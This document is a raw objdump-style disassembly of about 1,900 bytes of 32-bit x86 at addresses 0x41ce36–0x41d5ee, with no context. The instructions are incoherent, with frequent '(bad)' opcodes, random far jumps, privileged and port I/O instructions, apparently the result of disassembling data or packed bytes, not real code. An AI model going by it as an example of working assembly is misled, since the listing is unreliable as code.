  41ce36:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ce37:	push   ebp
  41ce38:	and    BYTE PTR [ebp-0x430947d2],dl
  41ce3e:	(bad)  
  41ce3f:	sub    eax,0xff526a98
  41ce44:	das    
  41ce45:	or     edi,ecx
  41ce47:	pusha  
  41ce48:	imul   ecx,DWORD PTR [edx+0x0],0xb60967ff
  41ce4f:	sub    bh,BYTE PTR [eax-0x65c48f93]
  41ce55:	or     ebp,DWORD PTR [esi]
  41ce57:	sbb    al,0x53
  41ce59:	enter  0xad33,0xa7
  41ce5d:	jp     0x41ce38
  41ce5f:	push   eax
  41ce60:	test   BYTE PTR [edx+0x40],ch
  41ce63:	pushf  
  41ce64:	xchg   edx,eax
  41ce65:	es std 
  41ce67:	jb     0x41ce56
  41ce69:	pop    ebx
  41ce6a:	jl     0x41ce53
  41ce6c:	shr    BYTE PTR [ecx],cl
  41ce6e:	(bad)  
  41ce6f:	sbb    dh,BYTE PTR [ebp-0x5d4bf831]
  41ce75:	cdq    
  41ce76:	andps  xmm0,XMMWORD PTR [ebx]
  41ce79:	popf   
  41ce7a:	mov    al,0x83
  41ce7c:	int    0xe7
  41ce7e:	mov    es,WORD PTR [ebx]
  41ce80:	xor    eax,0x163af5e3
  41ce85:	add    eax,DWORD PTR [ecx]
  41ce87:	cdq    
  41ce88:	and    esi,eax
  41ce8a:	xchg   esp,eax
  41ce8b:	out    dx,al
  41ce8c:	and    eax,DWORD PTR [ebp+0x6c]
  41ce8f:	pop    edi
  41ce90:	clc    
  41ce91:	mov    ebx,0x6dc1a87b
  41ce96:	(bad)
  41ce99:	pop    esp
  41ce9a:	adc    dh,dh
  41ce9c:	push   0x1d42931e
  41cea1:	sub    al,0xed
  41cea3:	sbb    ah,BYTE PTR [esi]
  41cea5:	push   esp
  41cea6:	push   esi
  41cea7:	sub    DWORD PTR [esi],esp
  41cea9:	cmp    BYTE PTR ds:0xe19a54c5,al
  41ceaf:	mov    WORD PTR [edx],?
  41ceb1:	ret    0x17fd
  41ceb4:	cld    
  41ceb5:	jo     0x41ce6a
  41ceb7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ceb8:	jae    0x41cf19
  41ceba:	mov    edi,0x7213949d
  41cebf:	xchg   ebx,eax
  41cec0:	push   ebx
  41cec1:	repnz cmp eax,0xbe9daa09
  41cec7:	mov    ch,0x4e
  41cec9:	mov    WORD PTR [esi],gs
  41cecb:	pop    esi
  41cecc:	pop    ss
  41cecd:	or     DWORD PTR [esi+0x3666c1f3],0x21bb6f07
  41ced7:	lods   al,BYTE PTR ds:[esi]
  41ced8:	xchg   dl,ch
  41ceda:	jae    0x41ceea
  41cedc:	int    0x88
  41cede:	mov    WORD PTR [edx+edi*2-0x43dc7486],?
  41cee5:	popf   
  41cee6:	jno    0x41cf52
  41cee8:	mov    cl,bl
  41ceea:	jp     0x41cf40
  41ceec:	shl    ecx,1
  41ceee:	(bad)  
  41ceef:	(bad)  
  41cef0:	imul   esp,esp,0xa44bf62d
  41cef6:	(bad)  
  41cef7:	pop    esi
  41cef8:	dec    eax
  41cef9:	sbb    DWORD PTR [ecx+0x55],esi
  41cefc:	mov    bh,0x97
  41cefe:	out    0xf5,eax
  41cf00:	cmp    eax,0xaba8db04
  41cf05:	sbb    eax,DWORD PTR [edx]
  41cf07:	pop    es
  41cf08:	mov    ah,0x91
  41cf0a:	imul   ebp,DWORD PTR [edi-0x2c2371db],0xffffffba
  41cf11:	(bad)  
  41cf12:	xor    eax,0x3c054f60
  41cf17:	add    BYTE PTR [ebx-0x60693681],0xd7
  41cf1e:	je     0x41cf67
  41cf20:	imul   eax,DWORD PTR es:[esi],0xc749393d
  41cf27:	and    eax,0x5e243e18
  41cf2c:	jbe    0x41cedb
  41cf2e:	sub    ah,BYTE PTR [edx-0xf6a9d3e]
  41cf34:	and    BYTE PTR [ecx+0x21],0x64
  41cf38:	push   edi
  41cf39:	xor    al,0x62
  41cf3b:	adc    eax,0xe280dcac
  41cf40:	sbb    ebx,ecx
  41cf42:	and    al,0xb8
  41cf44:	xchg   edx,eax
  41cf45:	adc    bl,dh
  41cf47:	adc    ch,BYTE PTR [edi+0xb26660]
  41cf4d:	ret    0x4d3c
  41cf50:	fnsave [edi+0x73fac3ab]
  41cf56:	test   eax,0xd4184c70
  41cf5b:	(bad)  [eax]
  41cf5d:	adc    DWORD PTR [ebx+0x37532432],ecx
  41cf63:	nop
  41cf64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cf65:	xor    esp,DWORD PTR [ebx]
  41cf67:	cdq    
  41cf68:	jbe    0x41cf2f
  41cf6a:	fiadd  WORD PTR [ebp*1+0x4b385d36]
  41cf71:	adc    eax,ecx
  41cf73:	or     BYTE PTR ds:0xaf0db506,cl
  41cf79:	inc    ebp
  41cf7a:	in     eax,dx
  41cf7b:	mov    ?,edi
  41cf7d:	add    eax,0xe641765
  41cf82:	mov    edi,0x39cb9fc4
  41cf87:	in     eax,0xe
  41cf89:	sbb    edi,DWORD PTR [edi+ebx*4+0x442caf99]
  41cf90:	jle    0x41cfe5
  41cf92:	cmp    BYTE PTR [eax+0x55ba86bf],ah
  41cf98:	test   DWORD PTR [ecx+0x2a],esi
  41cf9b:	mov    ebp,0x6ebba60a
  41cfa0:	fdivr  DWORD PTR [ebx-0xb282871]
  41cfa6:	push   edx
  41cfa7:	ins    DWORD PTR es:[edi],dx
  41cfa8:	mov    edi,0xd8ba8d90
  41cfad:	(bad)  
  41cfae:	loopne 0x41cfbb
  41cfb0:	jae    0x41cf41
  41cfb2:	jmp    0x664ce880
  41cfb7:	ins    DWORD PTR es:[edi],dx
  41cfb8:	jecxz  0x41cf9a
  41cfba:	jne    0x41cf8c
  41cfbc:	jb     0x41cf4b
  41cfbe:	xor    BYTE PTR [ebp-0xe],ah
  41cfc1:	mov    dl,0x7c
  41cfc3:	nop
  41cfc4:	pop    edx
  41cfc5:	push   cs
  41cfc6:	js     0x41d041
  41cfc8:	mov    bl,0xa6
  41cfca:	or     dl,ah
  41cfcc:	les    esp,FWORD PTR [ebx+0x5c07fbc3]
  41cfd2:	mov    ebx,0x3938ffdc
  41cfd7:	ins    DWORD PTR es:[edi],dx
  41cfd8:	fst    st(1)
  41cfda:	push   edi
  41cfdb:	je     0x41cf8f
  41cfdd:	out    0x34,al
  41cfdf:	mov    ds:0xbdc3a7c2,al
  41cfe4:	(bad)  
  41cfe5:	ret    
  41cfe6:	jle    0x41cfb3
  41cfe8:	push   es
  41cfe9:	pop    es
  41cfea:	retf   0x1a6c
  41cfed:	ss in  eax,0xeb
  41cff0:	es sbb eax,0xa6ee7ea5
  41cff6:	push   cs
  41cff7:	or     al,0x82
  41cff9:	xlat   BYTE PTR ds:[ebx]
  41cffa:	dec    edi
  41cffb:	mov    ch,BYTE PTR [esp+edi*2+0x5d]
  41cfff:	mov    bl,0x38
  41d001:	aad    0x59
  41d003:	xlat   BYTE PTR ds:[ebx]
  41d004:	out    0x39,eax
  41d006:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d007:	add    DWORD PTR [esi],ecx
  41d009:	push   ebp
  41d00a:	or     al,0x5c
  41d00c:	sub    esp,esi
  41d00e:	pop    esp
  41d00f:	inc    eax
  41d010:	xor    eax,DWORD PTR [ebx]
  41d012:	pop    edi
  41d013:	ja     0x41d071
  41d015:	in     eax,dx
  41d016:	xor    eax,0x4f3cb9a1
  41d01b:	mov    ch,0xac
  41d01d:	retf   
  41d01e:	inc    esi
  41d01f:	mov    esi,0xffd3f31b
  41d024:	mov    ecx,?
  41d026:	les    esp,FWORD PTR [esp+edx*2+0x6c]
  41d02a:	retf   
  41d02b:	lods   al,BYTE PTR ds:[esi]
  41d02c:	popf   
  41d02d:	xchg   edx,eax
  41d02e:	pop    edx
  41d02f:	pop    eax
  41d030:	mov    edx,0xa504ddd
  41d035:	lock es inc edx
  41d038:	fs in  eax,0xc3
  41d03b:	out    dx,eax
  41d03c:	mov    esi,0xfe85f4c0
  41d041:	xchg   edx,eax
  41d042:	xchg   BYTE PTR [ebx],bh
  41d044:	fwait
  41d045:	scas   al,BYTE PTR es:[edi]
  41d046:	cmp    BYTE PTR [edx-0x77],dh
  41d049:	ja     0x41d056
  41d04b:	push   ss
  41d04c:	je     0x41d068
  41d04e:	sub    al,cl
  41d050:	pop    ss
  41d051:	xchg   ebx,eax
  41d052:	inc    edx
  41d053:	mov    edx,0xe685094d
  41d058:	pop    esp
  41d059:	cmp    al,0xb
  41d05b:	retf   0x5253
  41d05e:	sbb    edi,0xffffffbd
  41d061:	sti    
  41d062:	push   edi
  41d063:	test   eax,0x1152d6e3
  41d068:	retf   
  41d069:	pop    edx
  41d06a:	push   eax
  41d06b:	pop    ecx
  41d06c:	dec    esi
  41d06d:	adc    al,0xa8
  41d06f:	arpl   bp,cx
  41d071:	fldcw  WORD PTR [ebx-0x24]
  41d074:	push   edx
  41d075:	ja     0x41d0cf
  41d077:	clc    
  41d078:	or     eax,0x423c3f41
  41d07d:	ss jp  0x41d063
  41d080:	into   
  41d081:	pop    edx
  41d082:	xlat   BYTE PTR ds:[ebx]
  41d083:	out    dx,eax
  41d084:	mov    esi,0x485e222e
  41d089:	mov    esi,ebx
  41d08b:	(bad)  
  41d08c:	sbb    al,0x9d
  41d08e:	jae    0x41d104
  41d090:	sub    edx,DWORD PTR ds:0x5e83737
  41d096:	push   eax
  41d097:	fs inc esi
  41d099:	cmp    DWORD PTR [edi],ebx
  41d09b:	enter  0xb589,0xbf
  41d09f:	dec    esp
  41d0a0:	dec    esi
  41d0a1:	xchg   ebx,eax
  41d0a2:	(bad)
  41d0a7:	mov    ds:0x10a9c3c8,al
  41d0ac:	stos   DWORD PTR es:[edi],eax
  41d0ad:	mov    edx,0x44a4ae60
  41d0b2:	xlat   BYTE PTR ds:[ebx]
  41d0b3:	mov    dh,0x9b
  41d0b5:	cmp    dl,ah
  41d0b7:	jns    0x41d0ce
  41d0b9:	pusha  
  41d0ba:	dec    ebp
  41d0bb:	and    eax,0xd69c8e8d
  41d0c0:	mov    ds:0x518c2d1f,eax
  41d0c5:	jecxz  0x41d06c
  41d0c7:	in     eax,0xd5
  41d0c9:	mov    ?,WORD PTR ds:0x2fb2ce2e
  41d0cf:	es gs pop edi
  41d0d2:	jns    0x41d0b0
  41d0d4:	test   al,0x70
  41d0d6:	in     eax,dx
  41d0d7:	jne    0x41d0dd
  41d0d9:	xor    ebp,edi
  41d0db:	sbb    ah,bl
  41d0dd:	out    dx,al
  41d0de:	add    ah,ah
  41d0e0:	push   cs
  41d0e1:	int    0xe2
  41d0e3:	pop    eax
  41d0e4:	mov    gs,WORD PTR [esi-0x24]
  41d0e7:	fwait
  41d0e8:	std    
  41d0e9:	jecxz  0x41d116
  41d0eb:	(bad)  
  41d0ed:	fst    QWORD PTR [ecx+ebx*8+0x65]
  41d0f1:	pop    ds
  41d0f2:	push   edx
  41d0f3:	xor    ebp,DWORD PTR [ecx+ecx*2]
  41d0f6:	and    eax,0xde8e9037
  41d0fb:	lods   al,BYTE PTR ds:[esi]
  41d0fc:	inc    BYTE PTR [ebx+0x4]
  41d0ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d100:	and    ecx,DWORD PTR [ebx]
  41d102:	sub    BYTE PTR [edx+edx*8-0x40],cl
  41d106:	push   ebx
  41d107:	jecxz  0x41d0b0
  41d109:	mov    ah,0x4b
  41d10b:	mov    ebx,0xc65f9a49
  41d110:	cmp    bh,BYTE PTR [edx+0x37]
  41d113:	call   DWORD PTR [esi]
  41d115:	inc    edx
  41d116:	(bad)  
  41d117:	xor    dh,cl
  41d119:	xor    al,0x27
  41d11b:	push   0xffffff9a
  41d11d:	add    eax,0xd2aadf9
  41d122:	ss and eax,0x47639ddc
  41d128:	cld    
  41d129:	or     eax,DWORD PTR [eax+0x44]
  41d12c:	and    al,0x0
  41d12e:	cmp    BYTE PTR [edx+0x7d350850],dh
  41d134:	push   ds
  41d135:	out    dx,eax
  41d136:	jbe    0x41d0f8
  41d138:	repnz xor al,0x53
  41d13b:	and    dl,BYTE PTR [edi+0x7b]
  41d13e:	or     eax,eax
  41d140:	or     DWORD PTR ds:0x742b5db9,ecx
  41d146:	out    0x5e,eax
  41d148:	add    BYTE PTR [esi-0x3e],0xbd
  41d14c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d14d:	cmp    eax,0x44701d1a
  41d152:	sbb    DWORD PTR [ecx+0x49],ebp
  41d155:	dec    ecx
  41d156:	jl     0x41d0fa
  41d158:	mov    eax,0x57817860
  41d15d:	add    eax,0xa934a43c
  41d162:	fmul   QWORD PTR [edi+0x16]
  41d165:	icebp  
  41d166:	pop    es
  41d167:	out    dx,eax
  41d168:	xchg   esi,eax
  41d169:	xchg   edx,eax
  41d16a:	dec    ebp
  41d16b:	rcl    DWORD PTR [ebp+0x14],1
  41d16e:	mov    edx,0x5d2fd760
  41d173:	sub    BYTE PTR [ebx],al
  41d175:	pop    edi
  41d176:	mov    BYTE PTR [esi-0x33a354ed],ch
  41d17c:	xor    eax,0x2860986c
  41d181:	sub    ebp,eax
  41d183:	ror    BYTE PTR [edi-0x6b127cfa],cl
  41d189:	xor    DWORD PTR [ecx+ebx*1-0x1d36aece],ebp
  41d190:	cmp    dh,cl
  41d192:	and    esp,ebx
  41d194:	or     DWORD PTR ds:0xcfdaf32b,eax
  41d19a:	(bad)
  41d19e:	sbb    al,0x22
  41d1a0:	std    
  41d1a1:	nop
  41d1a2:	je     0x41d173
  41d1a4:	mov    ch,0xc3
  41d1a6:	inc    eax
  41d1a7:	or     ah,bl
  41d1a9:	jae    0x41d13b
  41d1ab:	out    0xb6,eax
  41d1ad:	pop    esp
  41d1ae:	mov    ah,0x41
  41d1b0:	or     al,0x47
  41d1b2:	out    0x37,al
  41d1b4:	gs mov edx,0x6f7d1c67
  41d1ba:	sub    DWORD PTR [ebx],esp
  41d1bc:	retf   
  41d1bd:	add    BYTE PTR [edi+0x14],dl
  41d1c0:	sub    BYTE PTR [esi+0x17],0xcd
  41d1c4:	or     DWORD PTR [ebx+0x3cf8cfb9],edx
  41d1ca:	gs add eax,0x3e5da4c2
  41d1d0:	jne    0x41d165
  41d1d2:	add    al,0xc9
  41d1d4:	loope  0x41d1df
  41d1d6:	cmp    esi,DWORD PTR [eax*1-0x224e654a]
  41d1dd:	jmp    0x41d1c8
  41d1df:	xchg   DWORD PTR [edx+0x70e40acb],edx
  41d1e5:	jnp    0x41d1a9
  41d1e7:	iret   
  41d1e8:	inc    ecx
  41d1e9:	mov    eax,ds:0xb1aa9767
  41d1ee:	dec    edi
  41d1ef:	mov    esi,ebx
  41d1f1:	daa    
  41d1f2:	lahf   
  41d1f3:	fwait
  41d1f4:	pushf  
  41d1f5:	push   eax
  41d1f6:	aam    0x86
  41d1f8:	inc    edi
  41d1f9:	rol    BYTE PTR ds:0xf3ba545f,cl
  41d1ff:	inc    ebx
  41d200:	adc    ecx,DWORD PTR [ebx-0x4fa060de]
  41d206:	pop    ebx
  41d207:	jb     0x41d1c2
  41d209:	fldenv [ecx+0x6a]
  41d20c:	dec    ebx
  41d20d:	add    eax,0xe0345f56
  41d212:	(bad)  
  41d213:	cmc    
  41d214:	add    al,0x64
  41d216:	in     al,0xda
  41d218:	aaa    
  41d219:	inc    ebx
  41d21a:	xchg   edi,eax
  41d21b:	pop    ebx
  41d21c:	(bad)  
  41d21d:	call   0x1015c82c
  41d222:	xchg   esp,eax
  41d223:	inc    ebx
  41d224:	xor    DWORD PTR [eax],ebp
  41d226:	inc    edx
  41d227:	call   0x4dc01d4d
  41d22c:	sbb    DWORD PTR [ebx+0x2b6f7f1d],0x8
  41d233:	push   ss
  41d234:	mov    bl,0xc1
  41d236:	and    DWORD PTR [esi+ebp*2+0x14ee3d0c],ebp
  41d23d:	jnp    0x41d20f
  41d23f:	mov    dl,0x6b
  41d241:	jb     0x41d20e
  41d243:	adc    dl,al
  41d245:	sub    eax,0xe81b4219
  41d24a:	xor    eax,0xa34167f6
  41d24f:	push   0x2fedb59e
  41d254:	dec    ebx
  41d255:	test   ch,0x17
  41d258:	fwait
  41d259:	into   
  41d25a:	stc    
  41d25b:	mov    edx,0xa8d3a5a0
  41d260:	xor    DWORD PTR [edx],esp
  41d262:	push   eax
  41d263:	or     eax,0x48d61854
  41d268:	outs   dx,BYTE PTR ds:[esi]
  41d269:	leave  
  41d26a:	lods   eax,DWORD PTR ds:[esi]
  41d26b:	mov    dl,0x3e
  41d26d:	sar    DWORD PTR [edi+0x14],cl
  41d270:	mov    BYTE PTR fs:[esi-0x507da766],al
  41d277:	dec    ebp
  41d278:	aam    0xb0
  41d27a:	mov    eax,DWORD PTR [edi-0x27]
  41d27d:	ds jmp 0x41d2fc
  41d280:	and    al,BYTE PTR [edx-0x2b]
  41d283:	adc    BYTE PTR ds:0xdc968d52,dl
  41d289:	jae    0x41d23c
  41d28b:	daa    
  41d28c:	jg     0x41d28c
  41d28e:	scas   al,BYTE PTR es:[edi]
  41d28f:	(bad)  
  41d290:	call   0x269d9f95
  41d295:	inc    ebp
  41d296:	dec    ecx
  41d297:	sbb    BYTE PTR [ebp-0x5e],al
  41d29a:	jne    0x41d22c
  41d29c:	shr    BYTE PTR [esi-0x7e],cl
  41d29f:	pop    esi
  41d2a0:	mov    dh,0x23
  41d2a2:	rcr    BYTE PTR ds:[eax+0x49012c],cl
  41d2a9:	enter  0xeaed,0x76
  41d2ad:	or     BYTE PTR [edi+0x6a87e7ef],bl
  41d2b3:	jb     0x41d2a2
  41d2b5:	cmp    BYTE PTR [ebx+edx*8-0x1c],ch
  41d2b9:	xor    al,0xcc
  41d2bb:	in     al,dx
  41d2bc:	lahf   
  41d2bd:	ret    0xff68
  41d2c0:	mov    dl,0xd2
  41d2c2:	cli    
  41d2c3:	arpl   ax,sp
  41d2c5:	arpl   WORD PTR ds:0x10af6865,si
  41d2cb:	mov    dh,BYTE PTR cs:[eax]
  41d2ce:	rcl    BYTE PTR [edx+edx*4+0x14a5ccb7],0xda
  41d2d6:	sub    al,0x97
  41d2d8:	js     0x41d359
  41d2da:	(bad)  
  41d2dc:	fs lock fst st(5)
  41d2e0:	cmp    al,0x46
  41d2e2:	xchg   edi,eax
  41d2e3:	cli    
  41d2e4:	std    
  41d2e5:	aaa    
  41d2e6:	mov    eax,ds:0x9019491
  41d2eb:	fsubr  QWORD PTR [edx]
  41d2ed:	aaa    
  41d2ee:	outs   dx,BYTE PTR ds:[esi]
  41d2ef:	or     esp,DWORD PTR [edx+0x731e48ff]
  41d2f5:	jmp    0xfc78:0x197d1e2b
  41d2fc:	inc    ebx
  41d2fd:	push   esp
  41d2fe:	int3   
  41d2ff:	pop    ecx
  41d300:	sbb    dh,ch
  41d302:	(bad)  
  41d303:	arpl   WORD PTR [esi],ax
  41d305:	ret    0x88b4
  41d308:	mov    ecx,0x7c1b7faf
  41d30d:	inc    eax
  41d30e:	pusha  
  41d30f:	call   0xfad4de8f
  41d314:	dec    edx
  41d315:	aas    
  41d316:	sub    BYTE PTR [edx-0x53724e9b],ah
  41d31c:	lods   eax,DWORD PTR ds:[esi]
  41d31d:	aas    
  41d31e:	leave  
  41d31f:	ja     0x41d2b5
  41d321:	lods   al,BYTE PTR gs:[esi]
  41d323:	test   BYTE PTR [eax+edx*8],ah
  41d326:	out    dx,eax
  41d327:	mov    bl,ah
  41d329:	xchg   edx,eax
  41d32a:	leave  
  41d32b:	(bad)  
  41d32c:	shl    BYTE PTR [eax+0x4c625b2b],1
  41d332:	mov    edi,0x4f01e25b
  41d337:	lock popf 
  41d339:	imul   ebp,esi,0x8826b5b6
  41d33f:	push   edx
  41d340:	loopne 0x41d363
  41d342:	test   eax,0x80ec81d9
  41d347:	ins    BYTE PTR es:[edi],dx
  41d348:	xchg   ebx,eax
  41d349:	aam    0xa7
  41d34b:	mov    BYTE PTR [eax],dh
  41d34d:	inc    edi
  41d34e:	(bad)  
  41d34f:	aas    
  41d350:	xor    ch,cl
  41d352:	xchg   esp,eax
  41d353:	jmp    0x41d2e2
  41d355:	and    eax,0xf28a14df
  41d35a:	adc    esi,esp
  41d35c:	je     0x41d2e2
  41d35e:	sub    DWORD PTR [eax+0x21c68e5d],ebp
  41d364:	xor    bl,cl
  41d366:	xchg   esp,eax
  41d367:	jle    0x41d307
  41d369:	nop
  41d36a:	fistp  WORD PTR [ebp+eax*2-0x12]
  41d36e:	ds inc ebp
  41d370:	inc    esp
  41d371:	dec    eax
  41d372:	mov    ds:0xa783a835,eax
  41d377:	mov    ecx,0x7c98312e
  41d37c:	add    BYTE PTR [edi+0x72],0xe0
  41d380:	das    
  41d381:	mov    al,0xc2
  41d383:	(bad)  
  41d384:	sar    DWORD PTR [ebp-0x62a833b4],cl
  41d38a:	loop   0x41d3ad
  41d38c:	lahf   
  41d38d:	and    eax,0x34ca6ed3
  41d392:	push   0x6f
  41d394:	cmp    al,0x96
  41d396:	mov    edx,0xecbddb45
  41d39b:	mov    es,WORD PTR [edi]
  41d39d:	cs out dx,eax
  41d39f:	jl     0x41d383
  41d3a1:	test   al,0x11
  41d3a3:	mov    edx,0xa977ece7
  41d3a8:	or     eax,0x2f10bb37
  41d3ad:	repz mov ebx,0xc2130612
  41d3b3:	repz xor dx,dx
  41d3b7:	jmp    DWORD PTR [ebp-0x6f05100a]
  41d3bd:	arpl   bx,bp
  41d3bf:	sbb    eax,0xde658128
  41d3c4:	rcl    esp,1
  41d3c6:	push   edx
  41d3c7:	in     eax,0x51
  41d3c9:	or     BYTE PTR [eax-0x40c8c751],dl
  41d3cf:	and    eax,0xcd1c720d
  41d3d4:	lea    eax,[edx-0x39]
  41d3d7:	(bad)  
  41d3d9:	pushf  
  41d3da:	jmp    0x41d35e
  41d3dc:	shl    DWORD PTR [esi+0x7001c662],0x44
  41d3e3:	cli    
  41d3e4:	dec    ebx
  41d3e5:	sbb    eax,0x81f66821
  41d3ea:	mov    bh,0xe8
  41d3ec:	mov    esi,cr2
  41d3ef:	js     0x41d404
  41d3f1:	xchg   esi,eax
  41d3f2:	call   0xfd55:0x2f29ac46
  41d3f9:	repz add eax,0x269cc992
  41d3ff:	pop    es
  41d400:	std    
  41d401:	loopne 0x41d3f1
  41d403:	push   ecx
  41d404:	mov    ah,BYTE PTR [ebx]
  41d406:	fsubr  QWORD PTR [edi+0x10be4933]
  41d40c:	sar    DWORD PTR [edi],0x25
  41d40f:	and    eax,0xfdda61e1
  41d414:	test   DWORD PTR [ecx+0x3e3c8e36],0x3f5cf1b4
  41d41e:	xchg   ecx,eax
  41d41f:	daa    
  41d420:	ins    BYTE PTR es:[edi],dx
  41d421:	pop    ebx
  41d422:	or     al,0xf8
  41d424:	jmp    FWORD PTR [eax]
  41d426:	outs   dx,BYTE PTR ds:[esi]
  41d427:	dec    edi
  41d428:	setp   BYTE PTR [ebp-0x11]
  41d42c:	(bad)  
  41d42d:	mov    edx,0x46644eb8
  41d432:	or     dh,cl
  41d434:	mov    ecx,0xeeb6adf
  41d439:	pop    edi
  41d43a:	sbb    al,0xe3
  41d43c:	mov    cl,0x8c
  41d43e:	lods   al,BYTE PTR ds:[esi]
  41d43f:	sbb    BYTE PTR [ebx],dh
  41d441:	clc    
  41d442:	jno    0x41d47d
  41d444:	inc    esp
  41d445:	add    bh,BYTE PTR [esi*8+0x555d7567]
  41d44c:	sub    eax,0xe3a44080
  41d451:	(bad)  
  41d452:	jle    0x41d3e4
  41d454:	mov    dh,0xe9
  41d456:	cmp    eax,0x2665d18c
  41d45b:	cs push ds
  41d45d:	inc    ecx
  41d45e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d45f:	mov    edi,0xe934e590
  41d464:	data16 adc ch,BYTE PTR [ecx+0x6]
  41d468:	jo     0x41d40a
  41d46a:	fcom   st(4)
  41d46c:	iret   
  41d46d:	jne    0x41d4b2
  41d46f:	pop    ebx
  41d470:	jb     0x41d42d
  41d472:	call   0xd92c70ed
  41d477:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d478:	in     al,dx
  41d479:	mov    ch,0x9c
  41d47b:	dec    ebx
  41d47c:	outs   dx,DWORD PTR ds:[esi]
  41d47d:	dec    ebp
  41d47e:	imul   BYTE PTR [ecx]
  41d480:	sub    al,cl
  41d482:	shl    BYTE PTR [esp+ebp*1-0x52ff8325],cl
  41d489:	jg     0x41d4ff
  41d48b:	cld    
  41d48c:	fwait
  41d48d:	cmp    esi,DWORD PTR [esi+ecx*4-0x72d748eb]
  41d494:	lock (bad) 
  41d496:	push   eax
  41d497:	jns    0x41d4f7
  41d499:	sub    DWORD PTR [ecx-0x1ffd6146],ebx
  41d49f:	mov    ss,WORD PTR [eax+0x64]
  41d4a2:	inc    ecx
  41d4a3:	sbb    edi,esp
  41d4a5:	push   ds
  41d4a6:	jmp    0xbfd2:0x44b42571
  41d4ad:	xor    ch,BYTE PTR ds:0x871d34aa
  41d4b3:	gs lea ebx,ss:[edx-0x6f]
  41d4b8:	outs   dx,BYTE PTR ds:[esi]
  41d4b9:	fwait
  41d4ba:	jb     0x41d467
  41d4bc:	mov    dl,0xc9
  41d4be:	daa    
  41d4bf:	fnsave [edi+0x333d99b0]
  41d4c5:	pop    eax
  41d4c6:	call   0x99e8:0xab25513e
  41d4cd:	fild   DWORD PTR [edi+0x2e]
  41d4d0:	cdq    
  41d4d1:	stos   BYTE PTR es:[edi],al
  41d4d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d4d3:	push   esp
  41d4d4:	xchg   edi,eax
  41d4d5:	test   BYTE PTR ds:0x32b7c54a,dl
  41d4db:	mov    esp,DWORD PTR [ebx-0x4a]
  41d4de:	dec    ebx
  41d4df:	div    BYTE PTR [eax-0x32567014]
  41d4e5:	mov    esp,0x757c5076
  41d4ea:	nop
  41d4eb:	into   
  41d4ec:	stc    
  41d4ed:	jnp    0x41d4a2
  41d4ef:	pop    ss
  41d4f0:	xor    BYTE PTR [esi+0x3229db4],ah
  41d4f6:	fisubr WORD PTR [esi+0x3c1e50b]
  41d4fc:	jno    0x41d547
  41d4fe:	jl     0x41d4b5
  41d500:	stos   BYTE PTR es:[edi],al
  41d501:	mov    ebp,DWORD PTR [edi]
  41d503:	ins    BYTE PTR es:[edi],dx
  41d504:	or     bh,BYTE PTR [ecx]
  41d506:	xor    eax,0x67ffde
  41d50b:	mov    edi,DWORD PTR [ecx-0x70f139dd]
  41d511:	inc    esi
  41d512:	mov    WORD PTR [eax+0x3145fc6b],gs
  41d518:	pop    DWORD PTR [esp+eax*1-0x6e]
  41d51c:	enter  0x52ed,0xe1
  41d520:	sub    al,BYTE PTR [esi]
  41d522:	jae    0x41d4c8
  41d524:	in     eax,0xd1
  41d526:	add    BYTE PTR [ebx+0x141b1358],bh
  41d52c:	xor    esp,0xfd6d1ad5
  41d532:	mov    ebx,0x7ac00164
  41d537:	mov    bl,0x93
  41d539:	jns    0x41d583
  41d53b:	outs   dx,DWORD PTR ds:[esi]
  41d53c:	pushf  
  41d53d:	mov    ah,0xa7
  41d53f:	mov    esp,0x29d5f72
  41d544:	jle    0x41d5b4
  41d546:	sbb    ch,ah
  41d548:	sahf   
  41d549:	mov    edx,cr3
  41d54c:	mov    WORD PTR [edx],?
  41d54e:	jle    0x41d530
  41d550:	sbb    BYTE PTR [esp+eax*1+0x13c1ca97],0xc9
  41d558:	jge    0x41d5a0
  41d55a:	or     ch,BYTE PTR [ebx-0x5b]
  41d55d:	push   ecx
  41d55e:	gs dec ebx
  41d560:	mov    fs,eax
  41d562:	test   al,0xf7
  41d564:	cmp    al,0xec
  41d566:	mov    dh,0xbf
  41d568:	xor    DWORD PTR [eax+0x5508382a],ecx
  41d56e:	popa   
  41d56f:	inc    esp
  41d570:	sahf   
  41d571:	sub    bl,BYTE PTR [eax-0x7b]
  41d574:	fcmovnbe st,st(1)
  41d576:	fwait
  41d577:	stos   BYTE PTR es:[edi],al
  41d578:	(bad)
  41d57c:	(bad)  
  41d57d:	mov    edi,edx
  41d57f:	or     eax,0x505e6e42
  41d584:	ss push es
  41d586:	push   esp
  41d587:	(bad)  
  41d588:	dec    ebp
  41d589:	das    
  41d58a:	cmc    
  41d58b:	xchg   ecx,eax
  41d58c:	mov    al,ds:0x451448fd
  41d591:	cwde   
  41d592:	ds mov cl,ch
  41d595:	mov    ecx,DWORD PTR [ecx+edx*1+0x31]
  41d599:	mov    esp,0x8f29e673
  41d59e:	mov    WORD PTR [ebp-0x7f],ds
  41d5a1:	retf   
  41d5a2:	dec    ebx
  41d5a3:	xchg   esi,eax
  41d5a4:	(bad)  
  41d5a5:	or     eax,0xa550d798
  41d5aa:	pop    ss
  41d5ab:	jge    0x41d5a1
  41d5ad:	dec    edx
  41d5ae:	sub    DWORD PTR [eax+0x72],esp
  41d5b1:	fimul  WORD PTR [edx+0x75460cbf]
  41d5b7:	or     eax,0xb0fc275
  41d5bc:	into   
  41d5bd:	ret    0x29ad
  41d5c0:	inc    edx
  41d5c1:	add    esi,edx
  41d5c3:	or     cl,bh
  41d5c5:	enter  0x19be,0x84
  41d5c9:	mov    ch,0x12
  41d5cb:	jl     0x41d63c
  41d5cd:	adc    eax,0x7000bed4
  41d5d2:	lea    ebp,[edi]
  41d5d4:	pop    ss
  41d5d5:	lds    eax,FWORD PTR [edx]
  41d5d7:	mov    WORD PTR ss:[ecx-0x69aca734],ds
  41d5de:	or     ecx,DWORD PTR [esi+0xf]
  41d5e1:	ret    
  41d5e2:	mov    eax,ds:0x72fdbb86
  41d5e7:	jmp    0x5af4:0xdd20c9e5
  41d5ee:	xor    esi,DWORD PTR [ebp+0x5f]
